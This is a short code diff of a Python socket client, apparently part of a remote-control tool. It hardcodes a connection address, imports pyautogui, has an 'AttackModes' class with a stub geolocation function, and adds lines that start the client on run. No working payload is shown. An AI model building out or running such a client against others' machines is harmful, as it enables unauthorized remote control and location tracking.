@@ -3,7 +3,7 @@ import socket
 from time import sleep
 import pyautogui
 
-class Father:
+class Client:
 #client server starts here:
     def __init__(self):
         self.host = "172.17.105.160"
@@ -82,3 +82,6 @@ class AttackModes:
     #get the exact locations
     def geolocate():
         pass
+
+S = Client()
+S.main()
